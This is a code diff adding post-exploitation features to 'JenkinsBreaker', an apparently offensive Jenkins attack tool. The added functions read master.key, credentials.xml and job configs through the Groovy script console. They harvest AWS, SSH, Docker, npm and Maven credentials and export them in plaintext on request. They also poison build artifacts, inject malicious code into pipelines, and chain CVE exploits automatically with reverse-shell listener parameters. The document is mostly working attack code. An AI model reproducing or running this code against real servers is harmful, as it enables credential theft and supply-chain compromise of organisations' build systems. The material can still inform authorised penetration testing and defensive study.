@@ -35,7 +35,17 @@ import jwt
 import asyncio
 import websockets
 from fastapi import FastAPI
-from weasyprint import HTML
+import xml.etree.ElementTree as ET
+from pathlib import Path
+from reporting import ReportManager
+
+try:
+    from weasyprint import HTML
+    WEASYPRINT_AVAILABLE = True
+except (ImportError, OSError) as e:
+    WEASYPRINT_AVAILABLE = False
+    console = Console()
+    console.print("[yellow][!] WeasyPrint not available (PDF reports disabled)[/yellow]")
 
 VENV_DIR = os.path.join(os.path.dirname(__file__), ".venv_jenkinsbreaker")
 REQUIRED_PACKAGES = [
@@ -148,12 +158,14 @@ class JenkinsBreaker:
         self.misconfig_findings = []
         self.jwt_findings = []
         self.secret_matches = []
+        self.extracted_secrets = []
         self.command_history = []
         self.custom_headers = headers or {}
         self.proxies = {"http": proxy, "https": proxy} if proxy else {}
         self.delay = delay
         self.exploit_registry = {}
         self.websocket_open = False
+        self.report_manager = ReportManager()
         self.load_exploits()
 
     def load_exploits(self):
@@ -496,6 +508,471 @@ class JenkinsBreaker:
             except Exception as e:
                 console.print(f"[red][!] Failed: {e}[/red]")
 
+    def redact_secret(self, secret_value, reveal=False):
+        """Redact sensitive information unless reveal flag is set."""
+        if reveal or not secret_value:
+            return secret_value
+        
+        if len(secret_value) <= 8:
+            return "*" * len(secret_value)
+        return secret_value[:4] + "*" * (len(secret_value) - 8) + secret_value[-4:]
+    
+    def read_file_via_groovy(self, file_path, crumb_manager=None):
+        """Read a file using Groovy Script Console (requires authentication)."""
+        groovy_script = f'''
+try {{
+    def file = new File("{file_path}")
+    if (file.exists()) {{
+        println file.text
+    }} else {{
+        println "FILE_NOT_FOUND"
+    }}
+}} catch (Exception e) {{
+    println "ERROR: " + e.message
+}}
+'''
+        
+        try:
+            url = f"{self.jenkins_url}/scriptText"
+            headers = dict(self.custom_headers)
+            
+            if crumb_manager:
+                headers = crumb_manager.inject(headers)
+            
+            r = requests.post(
+                url,
+                data={"script": groovy_script},
+                auth=self.auth,
+                headers=headers,
+                proxies=self.proxies,
+                verify=False,
+                timeout=10
+            )
+            
+            if r.status_code == 200:
+                content = r.text.strip()
+                if content and content != "FILE_NOT_FOUND" and not content.startswith("ERROR:"):
+                    return content
+            return None
+        except Exception as e:
+            return None
+
+    def extract_secrets_from_config(self, config_path=None, reveal=False, crumb_manager=None):
+        """Extract secrets from Jenkins config.xml and credentials.xml files."""
+        console.print("[bold cyan][*] Extracting secrets from configuration files...[/bold cyan]")
+        
+        if config_path:
+            files_to_scan = [config_path]
+        else:
+            files_to_scan = [
+                "/var/jenkins_home/config.xml",
+                "/var/jenkins_home/credentials.xml",
+                "/var/jenkins_home/secrets/master.key",
+                "/var/jenkins_home/secrets/hudson.util.Secret"
+            ]
+        
+        extracted = []
+        
+        for file_path in files_to_scan:
+            try:
+                content = self.read_file_via_groovy(file_path, crumb_manager)
+                
+                if content:
+                    xml_tags = ['apiToken', 'password', 'privateKey', 'passphrase', 'secret', 
+                               'secretId', 'value', 'defaultValue', 'accessKey', 'secretAccessKey']
+                    
+                    for tag in xml_tags:
+                        matches = re.findall(f'<{tag}>([^<]+)</{tag}>', content)
+                        for match in matches:
+                            extracted.append({
+                                "source": file_path,
+                                "type": tag,
+                                "value": match,
+                                "redacted": self.redact_secret(match, reveal)
+                            })
+                            console.print(f"[green][+] Found {tag} in {file_path}: {self.redact_secret(match, reveal)}[/green]")
+            
+            except Exception as e:
+                pass
+        
+        self.extracted_secrets.extend(extracted)
+        console.print(f"[bold green][+] Extracted {len(extracted)} secrets from config files[/bold green]")
+        return extracted
+
+    def extract_job_secrets(self, job_name=None, reveal=False):
+        """Extract secrets from Jenkins job configuration files."""
+        console.print("[bold cyan][*] Extracting secrets from job configurations...[/bold cyan]")
+        
+        extracted = []
+        
+        if job_name:
+            jobs_to_scan = [{"name": job_name}]
+        else:
+            if not self.jobs:
+                self.enumerate_jobs()
+            jobs_to_scan = self.jobs
+        
+        for job in jobs_to_scan:
+            job_name = job.get("name", job)
+            
+            try:
+                config_url = f"{self.jenkins_url}/job/{job_name}/config.xml"
+                r = requests.get(
+                    config_url,
+                    auth=self.auth,
+                    headers=self.custom_headers,
+                    proxies=self.proxies,
+                    verify=False,
+                    timeout=10
+                )
+                
+                if r.status_code == 200:
+                    content = r.text
+                    
+                    xml_tags = ['apiToken', 'password', 'privateKey', 'passphrase', 'secret',
+                               'credentialsId', 'value', 'defaultValue']
+                    
+                    for tag in xml_tags:
+                        matches = re.findall(f'<{tag}>([^<]+)</{tag}>', content)
+                        for match in matches:
+                            extracted.append({
+                                "source": f"job/{job_name}/config.xml",
+                                "type": tag,
+                                "value": match,
+                                "redacted": self.redact_secret(match, reveal)
+                            })
+                            console.print(f"[green][+] Found {tag} in job {job_name}: {self.redact_secret(match, reveal)}[/green]")
+                    
+                    env_vars = self.extract_environment_variables(content, reveal)
+                    extracted.extend(env_vars)
+            
+            except Exception as e:
+                console.print(f"[yellow][!] Could not read job {job_name}: {e}[/yellow]")
+        
+        self.extracted_secrets.extend(extracted)
+        console.print(f"[bold green][+] Extracted {len(extracted)} secrets from job configurations[/bold green]")
+        return extracted
+
+    def extract_environment_variables(self, pipeline_content, reveal=False):
+        """Extract environment variables from pipeline definitions."""
+        extracted = []
+        
+        env_patterns = [
+            r'AWS_ACCESS_KEY_ID\s*[=:]\s*["\']?([A-Z0-9]{20})["\']?',
+            r'AWS_SECRET_ACCESS_KEY\s*[=:]\s*["\']?([A-Za-z0-9/+=]{40})["\']?',
+            r'DOCKER_PASSWORD\s*[=:]\s*["\']?([^"\']+)["\']?',
+            r'NPM_TOKEN\s*[=:]\s*["\']?([^"\']+)["\']?',
+            r'GITHUB_TOKEN\s*[=:]\s*["\']?([^"\']+)["\']?',
+            r'API_KEY\s*[=:]\s*["\']?([^"\']+)["\']?',
+            r'DATABASE_PASSWORD\s*[=:]\s*["\']?([^"\']+)["\']?',
+        ]
+        
+        for pattern in env_patterns:
+            matches = re.finditer(pattern, pipeline_content, re.IGNORECASE)
+            for match in matches:
+                var_name = pattern.split(r'\s*[=:]')[0].replace(r'\\', '')
+                extracted.append({
+                    "source": "pipeline_environment",
+                    "type": "environment_variable",
+                    "name": var_name,
+                    "value": match.group(1),
+                    "redacted": self.redact_secret(match.group(1), reveal)
+                })
+                console.print(f"[green][+] Found environment variable {var_name}: {self.redact_secret(match.group(1), reveal)}[/green]")
+        
+        return extracted
+
+    def scan_credential_files(self, base_path="/home/jenkins", reveal=False, crumb_manager=None):
+        """Scan for credential files in common locations (AWS, SSH, Docker, Maven)."""
+        console.print("[bold cyan][*] Scanning for credential files in common locations...[/bold cyan]")
+        
+        credential_paths = [
+            f"{base_path}/.aws/credentials",
+            f"{base_path}/.aws/config",
+            f"{base_path}/.ssh/id_rsa",
+            f"{base_path}/.ssh/id_ed25519",
+            f"{base_path}/.docker/config.json",
+            f"{base_path}/.m2/settings.xml",
+            f"{base_path}/.npmrc",
+            f"{base_path}/.config/database.env",
+            f"{base_path}/.config/api_keys.env",
+            f"{base_path}/.config/cloud.env",
+            "/tmp/scripts/deploy.sh",
+            "/opt/scripts/backup.sh"
+        ]
+        
+        extracted = []
+        
+        for file_path in credential_paths:
+            try:
+                content = self.read_file_via_groovy(file_path, crumb_manager)
+                
+                if content:
+                    
+                    console.print(f"[green][+] Found credential file: {file_path}[/green]")
+                    
+                    if "credentials" in file_path or ".env" in file_path or ".sh" in file_path:
+                        aws_patterns = [
+                            (r'aws_access_key_id\s*=\s*([A-Z0-9]{20})', "AWS_ACCESS_KEY_ID"),
+                            (r'aws_secret_access_key\s*=\s*([A-Za-z0-9/+=]{40})', "AWS_SECRET_ACCESS_KEY"),
+                            (r'AWS_ACCESS_KEY_ID\s*[=:]\s*["\']?([A-Z0-9]{20})["\']?', "AWS_ACCESS_KEY_ID"),
+                            (r'AWS_SECRET_ACCESS_KEY\s*[=:]\s*["\']?([A-Za-z0-9/+=]{40})["\']?', "AWS_SECRET_ACCESS_KEY"),
+                        ]
+                        
+                        for pattern, key_type in aws_patterns:
+                            matches = re.finditer(pattern, content, re.IGNORECASE)
+                            for match in matches:
+                                extracted.append({
+                                    "source": file_path,
+                                    "type": key_type,
+                                    "value": match.group(1),
+                                    "redacted": self.redact_secret(match.group(1), reveal)
+                                })
+                                console.print(f"[green][+] Found {key_type}: {self.redact_secret(match.group(1), reveal)}[/green]")
+                    
+                    if "id_rsa" in file_path or "id_ed25519" in file_path:
+                        if "PRIVATE KEY" in content:
+                            extracted.append({
+                                "source": file_path,
+                                "type": "SSH_PRIVATE_KEY",
+                                "value": content[:100] + "...",
+                                "redacted": "***SSH_PRIVATE_KEY***" if not reveal else content[:100] + "..."
+                            })
+                            console.print(f"[green][+] Found SSH private key in {file_path}[/green]")
+                    
+                    if ".npmrc" in file_path:
+                        npm_pattern = r'//registry\.npmjs\.org/:_authToken\s*=\s*([^\s]+)'
+                        matches = re.finditer(npm_pattern, content)
+                        for match in matches:
+                            extracted.append({
+                                "source": file_path,
+                                "type": "NPM_TOKEN",
+                                "value": match.group(1),
+                                "redacted": self.redact_secret(match.group(1), reveal)
+                            })
+                            console.print(f"[green][+] Found NPM token: {self.redact_secret(match.group(1), reveal)}[/green]")
+                    
+                    if "config.json" in file_path:
+                        try:
+                            docker_config = json.loads(content)
+                            if "auths" in docker_config:
+                                for registry, auth in docker_config["auths"].items():
+                                    if "auth" in auth:
+                                        extracted.append({
+                                            "source": file_path,
+                                            "type": "DOCKER_AUTH",
+                                            "registry": registry,
+                                            "value": auth["auth"],
+                                            "redacted": self.redact_secret(auth["auth"], reveal)
+                                        })
+                                        console.print(f"[green][+] Found Docker auth for {registry}: {self.redact_secret(auth['auth'], reveal)}[/green]")
+                        except:
+                            pass
+                    
+                    if "settings.xml" in file_path:
+                        server_pattern = r'<server>.*?<username>([^<]+)</username>.*?<password>([^<]+)</password>.*?</server>'
+                        matches = re.finditer(server_pattern, content, re.DOTALL)
+                        for match in matches:
+                            extracted.append({
+                                "source": file_path,
+                                "type": "MAVEN_CREDENTIALS",
+                                "username": match.group(1),
+                                "password": match.group(2),
+                                "redacted_password": self.redact_secret(match.group(2), reveal)
+                            })
+                            console.print(f"[green][+] Found Maven credentials: {match.group(1)} / {self.redact_secret(match.group(2), reveal)}[/green]")
+            
+            except Exception as e:
+                pass
+        
+        self.extracted_secrets.extend(extracted)
+        console.print(f"[bold green][+] Scanned credential files, found {len(extracted)} secrets[/bold green]")
+        return extracted
+
+    @confirm_action("poison build artifacts (DESTRUCTIVE)")
+    def poison_artifact(self, job_name, artifact_name, payload, crumb_manager=None):
+        """Inject malicious payloads into build artifacts."""
+        console.print(f"[bold yellow][*] Poisoning artifact {artifact_name} in job {job_name}...[/bold yellow]")
+        
+        try:
+            build_url = f"{self.jenkins_url}/job/{job_name}/lastSuccessfulBuild/api/json"
+            r = requests.get(
+                build_url,
+                auth=self.auth,
+                headers=self.custom_headers,
+                proxies=self.proxies,
+                verify=False,
+                timeout=10
+            )
+            
+            if r.status_code == 200:
+                build_info = r.json()
+                build_number = build_info.get("number")
+                
+                console.print(f"[green][+] Found build #{build_number}[/green]")
+                
+                groovy_script = f'''
+import hudson.model.*
+
+def job = Jenkins.instance.getItemByFullName("{job_name}")
+def build = job.getBuildByNumber({build_number})
+def artifactsDir = build.getArtifactsDir()
+
+def poisonedFile = new File(artifactsDir, "{artifact_name}")
+poisonedFile.write("{payload}")
+
+println "Artifact poisoned: ${{poisonedFile.absolutePath}}"
+'''
+                
+                script_url = f"{self.jenkins_url}/scriptText"
+                headers = dict(self.custom_headers)
+                
+                if crumb_manager:
+                    headers = crumb_manager.inject(headers)
+                
+                r = requests.post(
+                    script_url,
+                    data={"script": groovy_script},
+                    auth=self.auth,
+                    headers=headers,
+                    proxies=self.proxies,
+                    verify=False,
+                    timeout=10
+                )
+                
+                if r.status_code == 200:
+                    console.print(f"[bold green][+] Successfully poisoned artifact {artifact_name}[/bold green]")
+                    console.print(f"[yellow][*] Payload: {payload[:100]}...[/yellow]")
+                    self.exploits_attempted.append({
+                        "exploit": "artifact_poisoning",
+                        "job": job_name,
+                        "artifact": artifact_name,
+                        "status": "success"
+                    })
+                    return True
+                else:
+                    console.print(f"[red][-] Failed to poison artifact: {r.status_code}[/red]")
+                    return False
+            else:
+                console.print(f"[red][-] Could not find build information: {r.status_code}[/red]")
+                return False
+        
+        except Exception as e:
+            console.print(f"[red][!] Error poisoning artifact: {e}[/red]")
+            return False
+
+    @confirm_action("inject malicious pipeline (DESTRUCTIVE)")
+    def inject_pipeline(self, job_name, malicious_pipeline, crumb_manager=None):
+        """Modify pipeline definitions to inject malicious code."""
+        console.print(f"[bold yellow][*] Injecting malicious pipeline into job {job_name}...[/bold yellow]")
+        
+        try:
+            config_url = f"{self.jenkins_url}/job/{job_name}/config.xml"
+            r = requests.get(
+                config_url,
+                auth=self.auth,
+                headers=self.custom_headers,
+                proxies=self.proxies,
+                verify=False,
+                timeout=10
+            )
+            
+            if r.status_code == 200:
+                config_xml = r.text
+                
+                try:
+                    root = ET.fromstring(config_xml)
+                    
+                    definition = root.find(".//definition")
+                    if definition is not None:
+                        script_elem = definition.find("script")
+                        if script_elem is not None:
+                            original_script = script_elem.text
+                            console.print(f"[yellow][*] Original pipeline length: {len(original_script)} chars[/yellow]")
+                            
+                            injected_script = malicious_pipeline + "\n\n" + original_script
+                            script_elem.text = injected_script
+                            
+                            modified_xml = ET.tostring(root, encoding='unicode')
+                            
+                            headers = dict(self.custom_headers)
+                            headers["Content-Type"] = "application/xml"
+                            
+                            if crumb_manager:
+                                headers = crumb_manager.inject(headers)
+                            
+                            r = requests.post(
+                                config_url,
+                                data=modified_xml,
+                                auth=self.auth,
+                                headers=headers,
+                                proxies=self.proxies,
+                                verify=False,
+                                timeout=10
+                            )
+                            
+                            if r.status_code == 200:
+                                console.print(f"[bold green][+] Successfully injected pipeline into {job_name}[/bold green]")
+                                console.print(f"[yellow][*] Injected code: {malicious_pipeline[:100]}...[/yellow]")
+                                self.exploits_attempted.append({
+                                    "exploit": "pipeline_injection",
+                                    "job": job_name,
+                                    "status": "success"
+                                })
+                                return True
+                            else:
+                                console.print(f"[red][-] Failed to update pipeline: {r.status_code}[/red]")
+                                return False
+                        else:
+                            console.print(f"[red][-] No script element found in pipeline[/red]")
+                            return False
+                    else:
+                        console.print(f"[red][-] No definition element found in job config[/red]")
+                        return False
+                
+                except ET.ParseError as e:
+                    console.print(f"[red][-] Failed to parse XML: {e}[/red]")
+                    return False
+            else:
+                console.print(f"[red][-] Could not retrieve job config: {r.status_code}[/red]")
+                return False
+        
+        except Exception as e:
+            console.print(f"[red][!] Error injecting pipeline: {e}[/red]")
+            return False
+
+    def export_secrets(self, output_file="secrets.json", reveal=False):
+        """Export all extracted secrets to a JSON file."""
+        console.print(f"[bold cyan][*] Exporting secrets to {output_file}...[/bold cyan]")
+        
+        try:
+            export_data = {
+                "target": self.jenkins_url,
+                "timestamp": datetime.now().isoformat(),
+                "secrets_count": len(self.extracted_secrets),
+                "secrets": self.extracted_secrets if reveal else [
+                    {k: v for k, v in secret.items() if k != "value"}
+                    for secret in self.extracted_secrets
+                ]
+            }
+            
+            output_path = Path(output_file)
+            output_path.parent.mkdir(parents=True, exist_ok=True)
+            
+            with open(output_file, 'w') as f:
+                json.dump(export_data, f, indent=2)
+            
+            console.print(f"[bold green][+] Exported {len(self.extracted_secrets)} secrets to {output_file}[/bold green]")
+            
+            if not reveal:
+                console.print("[yellow][*] Secrets redacted. Use --reveal-secrets to export plaintext values[/yellow]")
+            
+            return True
+        
+        except Exception as e:
+            console.print(f"[red][!] Failed to export secrets: {e}[/red]")
+            return False
+
     def scan_ports(self, ports=[22, 80, 443, 8080]):
         """Scan common ports on the Jenkins server."""
         hostname = urlparse(self.jenkins_url).hostname
@@ -728,6 +1205,336 @@ class JenkinsBreaker:
 
         return version
 
+
+    def fingerprint_plugins(self):
+        """
+        Enumerate installed plugins via /pluginManager/api/json.
+        Returns dict mapping plugin short names to versions.
+        """
+        if self.delay:
+            time.sleep(self.delay)
+        
+        plugins_data = {}
+        url = f"{self.jenkins_url}/pluginManager/api/json?depth=1"
+        
+        try:
+            r = requests.get(
+                url, 
+                auth=self.auth, 
+                headers=self.custom_headers, 
+                proxies=self.proxies, 
+                verify=False, 
+                timeout=10
+            )
+            
+            if r.status_code == 200:
+                data = r.json()
+                plugins = data.get("plugins", [])
+                
+                console.print(f"[green][+] Enumerated {len(plugins)} plugins[/green]")
+                
+                for plugin in plugins:
+                    short_name = plugin.get("shortName", "unknown")
+                    version = plugin.get("version", "unknown")
+                    enabled = plugin.get("enabled", False)
+                    
+                    plugins_data[short_name] = {
+                        "version": version,
+                        "enabled": enabled,
+                        "long_name": plugin.get("longName", ""),
+                        "has_update": plugin.get("hasUpdate", False)
+                    }
+                
+                self.plugins = plugins_data
+                return plugins_data
+            else:
+                console.print(f"[yellow][!] Plugin enumeration failed: HTTP {r.status_code}[/yellow]")
+                console.print("[yellow]    May require authentication or Admin permission[/yellow]")
+                return {}
+                
+        except Exception as e:
+            console.print(f"[red][!] Plugin fingerprinting error: {e}[/red]")
+            return {}
+
+    def match_cve_to_version(self, cve_metadata, jenkins_version=None, plugin_versions=None):
+        """
+        Determine if a CVE is applicable based on version ranges.
+        
+        Args:
+            cve_metadata: ExploitMetadata object
+            jenkins_version: Jenkins core version string (e.g., "2.426.1")
+            plugin_versions: Dict of plugin names to versions
+            
+        Returns:
+            bool: True if vulnerable, False otherwise
+        """
+        if jenkins_version is None:
+            jenkins_version = self.version
+        
+        if plugin_versions is None:
+            plugin_versions = self.plugins if isinstance(self.plugins, dict) else {}
+        
+        affected = cve_metadata.affected_versions
+        
+        if not affected or not jenkins_version:
+            return False
+        
+        try:
+            current_version = [int(x) for x in jenkins_version.split('.')]
+        except:
+            console.print(f"[yellow][!] Could not parse version: {jenkins_version}[/yellow]")
+            return False
+        
+        for version_spec in affected:
+            spec = version_spec.strip()
+            
+            if spec.startswith("<="):
+                max_ver_str = spec.replace("<=", "").strip().split()[0]
+                try:
+                    max_ver = [int(x) for x in max_ver_str.split('.')]
+                    if current_version[:len(max_ver)] <= max_ver:
+                        return True
+                except:
+                    continue
+            
+            elif spec.startswith("<"):
+                max_ver_str = spec.replace("<", "").strip().split()[0]
+                try:
+                    max_ver = [int(x) for x in max_ver_str.split('.')]
+                    if current_version[:len(max_ver)] < max_ver:
+                        return True
+                except:
+                    continue
+            
+            elif spec.startswith(">="):
+                min_ver_str = spec.replace(">=", "").strip().split()[0]
+                try:
+                    min_ver = [int(x) for x in min_ver_str.split('.')]
+                    if current_version[:len(min_ver)] >= min_ver:
+                        return True
+                except:
+                    continue
+                    
+            elif spec.startswith(">"):
+                min_ver_str = spec.replace(">", "").strip().split()[0]
+                try:
+                    min_ver = [int(x) for x in min_ver_str.split('.')]
+                    if current_version[:len(min_ver)] > min_ver:
+                        return True
+                except:
+                    continue
+            
+            elif "plugin:" in spec.lower():
+                parts = spec.split(":")
+                if len(parts) >= 2:
+                    plugin_name = parts[1].strip()
+                    if plugin_name in plugin_versions:
+                        return True
+        
+        return False
+
+    def determine_safe_execution_order(self, applicable_cves):
+        """
+        Determine safe execution order for exploits.
+        Order: File Read -> Info Disclosure -> RCE -> Privesc
+        
+        Args:
+            applicable_cves: List of (cve_id, metadata, module) tuples
+            
+        Returns:
+            List of ordered exploit modules with priorities
+        """
+        priority_map = {
+            "file-read": 1,
+            "information-disclosure": 2,
+            "rce": 3,
+            "privilege-escalation": 4,
+            "code-execution": 3,
+            "credential-theft": 2
+        }
+        
+        ordered = []
+        
+        for cve_id, metadata, module in applicable_cves:
+            tags = metadata.tags if hasattr(metadata, 'tags') else []
+            
+            priority = 5
+            for tag in tags:
+                if tag in priority_map:
+                    priority = min(priority, priority_map[tag])
+            
+            ordered.append({
+                "cve_id": cve_id,
+                "metadata": metadata,
+                "module": module,
+                "priority": priority,
+                "tags": tags
+            })
+        
+        ordered.sort(key=lambda x: x["priority"])
+        
+        return ordered
+
+    def auto_exploit_with_fingerprinting(self, lhost=None, lport=None, dry_run=False):
+        """
+        Enhanced auto-exploit mode with version fingerprinting and safe execution.
+        
+        Args:
+            lhost: Listener host for reverse shells
+            lport: Listener port
+            dry_run: If True, only show what would be executed
+            
+        Returns:
+            List of exploit results
+        """
+        console.print("[bold cyan][*] Auto-Exploitation with Fingerprinting[/bold cyan]")
+        console.print("[yellow][*] Phase 1: Reconnaissance and Fingerprinting[/yellow]")
+        
+        if not self.version:
+            console.print("[yellow][*] Detecting Jenkins version...[/yellow]")
+            self.enumerate_version()
+        
+        console.print(f"[green][+] Jenkins Version: {self.version}[/green]")
+        
+        self.report_manager.set_target_info(
+            url=self.jenkins_url,
+            version=self.version
+        )
+        
+        console.print("[yellow][*] Enumerating plugins...[/yellow]")
+        plugins = self.fingerprint_plugins()
+        
+        if plugins:
+            console.print(f"[green][+] Found {len(plugins)} plugins[/green]")
+            for name, info in list(plugins.items())[:5]:
+                console.print(f"    - {name}: {info['version']}")
+            if len(plugins) > 5:
+                console.print(f"    ... and {len(plugins) - 5} more")
+        
+        console.print("[yellow][*] Phase 2: CVE Matching[/yellow]")
+        
+        from exploits import ExploitRegistry
+        registry = ExploitRegistry()
+        registry.load_all_modules()
+        
+        applicable_cves = []
+        
+        for module_name in registry._modules.keys():
+            metadata = registry.get_metadata(module_name)
+            if metadata:
+                if self.match_cve_to_version(metadata, self.version, plugins):
+                    module = registry.get_module(module_name)
+                    applicable_cves.append((metadata.cve_id, metadata, module))
+                    console.print(f"[green][+] Applicable: {metadata.cve_id} - {metadata.name}[/green]")
+        
+        if not applicable_cves:
+            console.print("[yellow][!] No applicable CVEs found for this Jenkins version[/yellow]")
+            console.print("[yellow]    Consider manual exploitation or plugin-specific attacks[/yellow]")
+            return []
+        
+        console.print(f"[cyan][*] Found {len(applicable_cves)} applicable exploits[/cyan]")
+        
+        console.print("[yellow][*] Phase 3: Execution Order Determination[/yellow]")
+        ordered_exploits = self.determine_safe_execution_order(applicable_cves)
+        
+        console.print("[cyan][*] Safe Execution Order:[/cyan]")
+        for i, exploit in enumerate(ordered_exploits, 1):
+            tags_str = ", ".join(exploit["tags"]) if exploit["tags"] else "generic"
+            console.print(f"  {i}. {exploit['cve_id']} - Priority {exploit['priority']} ({tags_str})")
+        
+        if dry_run:
+            console.print("[yellow][*] Dry-run mode: No exploits will be executed[/yellow]")
+            return []
+        
+        console.print("[bold red][!] Warning: About to execute exploits in order[/bold red]")
+        console.print("[bold red][!] Proceed? [y/N][/bold red]")
+        response = input().strip().lower()
+        
+        if response != 'y':
+            console.print("[yellow][*] Auto-exploitation cancelled[/yellow]")
+            return []
+        
+        console.print("[yellow][*] Phase 4: Exploit Execution[/yellow]")
+        
+        results = []
+        
+        for i, exploit in enumerate(ordered_exploits, 1):
+            console.print(f"[cyan][*] Executing {i}/{len(ordered_exploits)}: {exploit['cve_id']}[/cyan]")
+            
+            module = exploit["module"]
+            metadata = exploit["metadata"]
+            
+            if hasattr(module, 'check_vulnerable'):
+                console.print("[yellow][*] Checking vulnerability...[/yellow]")
+                if not module.check_vulnerable(self):
+                    console.print(f"[yellow][!] {exploit['cve_id']}: Target not vulnerable, skipping[/yellow]")
+                    continue
+            
+            try:
+                result = module.run(self, lhost=lhost, lport=lport)
+                results.append(result)
+                
+                if hasattr(result, 'status'):
+                    self.report_manager.log_exploit(
+                        exploit_name=metadata.name,
+                        cve_id=exploit['cve_id'],
+                        status=result.status,
+                        details=result.details if hasattr(result, 'details') else "No details",
+                        mitre_ids=metadata.mitre_attack,
+                        data=result.data if hasattr(result, 'data') else {}
+                    )
+                    
+                    if result.status == "success":
+                        console.print(f"[green][+] {exploit['cve_id']}: Success[/green]")
+                        
+                        if metadata.requires_crumb or "rce" in metadata.tags:
+                            console.print("[yellow][!] RCE achieved, consider stopping auto-exploitation[/yellow]")
+                            console.print("[yellow]    Continue with remaining exploits? [y/N][/yellow]")
+                            cont = input().strip().lower()
+                            if cont != 'y':
+                                console.print("[yellow][*] Stopping auto-exploitation[/yellow]")
+                                break
+                    elif result.status == "failed":
+                        console.print(f"[red][-] {exploit['cve_id']}: Failed - {result.details}[/red]")
+                    else:
+                        console.print(f"[yellow][!] {exploit['cve_id']}: {result.status}[/yellow]")
+                else:
+                    self.report_manager.log_exploit(
+                        exploit_name=metadata.name,
+                        cve_id=exploit['cve_id'],
+                        status="unknown",
+                        details="No result status returned",
+                        mitre_ids=metadata.mitre_attack,
+                        data={}
+                    )
+                        
+            except Exception as e:
+                console.print(f"[red][!] {exploit['cve_id']}: Error during execution - {e}[/red]")
+                error_result = {
+                    "exploit": exploit['cve_id'],
+                    "status": "error",
+                    "details": str(e)
+                }
+                results.append(error_result)
+                
+                self.report_manager.log_exploit(
+                    exploit_name=metadata.name,
+                    cve_id=exploit['cve_id'],
+                    status="error",
+                    details=str(e),
+                    mitre_ids=metadata.mitre_attack,
+                    data={}
+                )
+            
+            time.sleep(self.delay if self.delay else 1)
+        
+        console.print("[bold green][+] Auto-exploitation complete[/bold green]")
+        console.print(f"[cyan][*] Executed {len(results)} exploits[/cyan]")
+        
+        success_count = sum(1 for r in results if hasattr(r, 'status') and r.status == 'success')
+        console.print(f"[green][+] Successful: {success_count}/{len(results)}[/green]")
+        
+        return results
 
     def check_websocket_cli(self):
         """Probe for WebSocket CLI vulnerabilities."""
@@ -1009,41 +1816,48 @@ class JenkinsBreaker:
 
         console.print("[bold yellow][*] Watch your Netcat listener for the incoming shell![/bold yellow]\n")
 
-    def export_report(self, filename="report.json", format="json"):
-        """Export findings to JSON or Markdown report."""
-        cve_descriptions = {
-            "CVE-2019-1003029/1003030": "Groovy RCE via checkScript endpoint (unauthenticated in older versions).",
-            "CVE-2024-23897": "Arbitrary file read via CLI @file syntax (unauthenticated in some setups).",
-            "CVE-2025-31720": "Retrieve all agent configurations (requires Agent/Configure permission).",
-            "CVE-2025-31721": "Retrieve secrets from agent configurations (requires Agent/Configure permission).",
-            "CVE-2025-31722": "RCE via Templating Engine Plugin."
-        }
-        report_data = {
-            "timestamp": datetime.now().isoformat(),
-            "version": self.version,
-            "vulnerabilities": [{"cve": cve, "description": cve_descriptions.get(cve, "No description available")} for cve, _ in self.vulnerabilities],
-            "plugins": self.plugins,
-            "jobs": self.jobs,
-            "exploits_attempted": self.exploits_attempted,
-            "decrypted_secrets": self.decrypted_secrets,
-            "ssrf_findings": self.ssrf_findings,
-            "misconfig_findings": self.misconfig_findings,
-            "jwt_findings": self.jwt_findings,
-            "secret_matches": self.secret_matches,
-            "command_history": self.command_history
-        }
-        if format == "json":
-            with open(filename, "w") as f:
-                json.dump(report_data, f, indent=4)
-        elif format == "md":
-            env = Environment(loader=FileSystemLoader("."))
-            template = env.get_template("report_template.md")
-            with open(filename, "w") as f:
-                f.write(template.render(**report_data))
+    def export_report(self, filename=None, format="json"):
+        """
+        Export findings using the new ReportManager system.
+        
+        Args:
+            filename: Optional custom filename
+            format: Report format ('json', 'md', 'pdf', or 'all')
+        """
+        self.report_manager.set_target_info(
+            url=self.jenkins_url,
+            version=self.version,
+            plugins=[p.get("shortName", "") for p in self.plugins] if self.plugins else [],
+            vulnerabilities=[v[0] for v in self.vulnerabilities]
+        )
+        
+        for exploit in self.exploits_attempted:
+            cve_id = exploit.get("exploit", "").split("_")
+            if len(cve_id) >= 3 and cve_id[0] == "CVE":
+                cve = f"CVE-{cve_id[1]}-{cve_id[2]}"
+            else:
+                cve = exploit.get("exploit", "UNKNOWN")
+                
+            self.report_manager.log_exploit(
+                exploit_name=exploit.get("exploit", "Unknown"),
+                cve_id=cve,
+                status=exploit.get("status", "unknown"),
+                details=exploit.get("details", "No details"),
+                mitre_ids=[],
+                data=exploit
+            )
+        
+        if format == "all":
+            results = self.report_manager.generate_all_reports(['json', 'md', 'pdf', 'mitre'])
+            console.print("[green][+] All report formats generated[/green]")
+        elif format == "json":
+            self.report_manager.generate_json_report(filename)
+        elif format in ["md", "markdown"]:
+            self.report_manager.generate_markdown_report(filename)
         elif format == "pdf":
-            html_content = Markdown(json.dumps(report_data, indent=4)).markup
-            self.generate_pdf_report(html_content, filename)
-        console.print(f"[green][+] Report saved to {filename}[/green]")
+            self.report_manager.generate_pdf_report(filename)
+            
+        self.report_manager.print_summary()
         self.command_history.append({"command": "export_report", "timestamp": datetime.now().isoformat()})
 
     def save_history(self, filename, format="markdown"):
@@ -1668,6 +2482,16 @@ def main():
     recon_group.add_argument("--scan-ports", action="store_true", help="Scan common ports on the Jenkins server")
     recon_group.add_argument("--list-agents", action="store_true", help="Retrieve agent configurations (CVE-2025-31720)")
     recon_group.add_argument("--agent-secrets", action="store_true", help="Retrieve secrets from agents (CVE-2025-31721)")
+    
+    # Post-Exploitation and Secrets Extraction Options
+    postex_group = parser.add_argument_group("[bold cyan]Post-Exploitation and Secrets Extraction Options[/bold cyan]")
+    postex_group.add_argument("--extract-secrets", action="store_true", help="Extract secrets from config.xml, credentials.xml, and job files")
+    postex_group.add_argument("--extract-job-secrets", action="store_true", help="Extract secrets from all job configurations")
+    postex_group.add_argument("--scan-credential-files", action="store_true", help="Scan for AWS, SSH, Docker, Maven credential files")
+    postex_group.add_argument("--reveal-secrets", action="store_true", help="Show plaintext secrets (default: redacted)")
+    postex_group.add_argument("--export-secrets", type=str, metavar="FILE", help="Export extracted secrets to JSON file")
+    postex_group.add_argument("--poison-artifact", nargs=3, metavar=("JOB", "ARTIFACT", "PAYLOAD"), help="Inject malicious payload into build artifact")
+    postex_group.add_argument("--inject-pipeline", nargs=2, metavar=("JOB", "PAYLOAD"), help="Inject malicious code into pipeline definition")
 
     # Exploitation Options
